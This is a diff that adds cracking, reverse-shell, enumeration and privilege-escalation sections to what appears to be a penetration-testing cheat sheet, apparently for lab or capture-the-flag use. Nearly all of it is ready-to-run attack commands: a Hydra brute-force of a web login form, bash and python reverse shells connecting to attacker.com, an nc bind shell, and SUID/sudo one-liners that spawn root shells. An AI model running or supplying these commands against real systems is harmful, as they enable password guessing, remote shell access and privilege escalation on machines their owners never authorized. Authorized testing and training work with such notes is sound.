@@ -38,3 +38,126 @@ Wordlists:
 
 * [ ] `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
 * [ ] `/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-*`
+
+## CRACKING
+
+### Hydra
+
+Format:
+
+* `-l` login, `-L` wordlist for logins
+* `-p` password, `-P` wordlist for passwords
+* `-V`
+* `http-post-form` or `https-post-form`
+* `"login form":"POST form":"Failed Message"` see example below
+
+```bash
+hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.60 -V https-post-form '/index.php:__csrf_magic=sid%3Ad09980e510f7e924131941c772682ffbc566d7b3%2C1650961765&usernamefld=^USER^&passwordfld=^PASS^&login=Login:Username or Password incorrect'
+```
+
+## REVERSE SHELLS
+
+### bash
+
+```bash
+export RHOST=attacker.com
+export RPORT=443
+bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
+```
+
+listener: `sudo rlwrap nc -nlvp 443`
+
+### bind shell
+
+traditional nc only (i.e. with `-e` option):
+
+```bash
+# on target machine
+LPORT=12345
+nc -l -p $LPORT -e /bin/sh 
+```
+
+### python
+
+```bash
+export RHOST=attacker.com
+export RPORT=12345
+python -c 'import sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")'
+```
+
+listener: `socat file:`tty`,raw,echo=0 tcp-listen:12345`
+
+### Upgrade your shell
+
+Python:
+
+```bash
+which python 
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Bash:
+
+```bash
+SHELL=/bin/bash script -q /dev/null
+```
+
+STTY:
+
+1. `ctrl-z` to background your reverse shell
+2. attack machine: `stty raw -echo` to send control characters through the reverse shell
+3. attack machine: `stty size` and take note of rows & cols
+4. `fg` to foreground your reverse shell again
+
+finally, on target:
+
+```bash
+export SHELL=bash
+stty rows $x columns $y #Set remote shell to x number of rows & y columns
+export TERM=xterm-256color #allows you to clear console, and have color output
+```
+
+## ENUMERATE LINUX
+
+* [ ] `sudo -l`
+* [ ] `find / -user $username` - find everything this user owns.
+* [ ] `find -perms /4000 2>/dev/null` find suids
+
+Other finds:
+
+```bash
+find / -writable -type d 2>/dev/null
+find / -perm -222 -type d 2>/dev/null 
+find / -perm -o w -type d 2>/dev/null 
+find / -perm -o x -type d 2>/dev/null 
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
+```
+
+## PRIVESC
+
+### SUID & SUDO
+
+* [ ] if suid file run `less`, `man`, type `!/bin/sh` inside + enter
+
+bash:
+
+```bash
+# suid: get suid bin to run this
+./bash -p
+# sudo: 
+sudo bash
+```
+
+python:
+
+```bash
+# suid: get the suid bin to run this 
+./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+# sudo: spawn /bin/sh
+sudo python -c 'import os; os.system("/bin/sh")'
+```
+
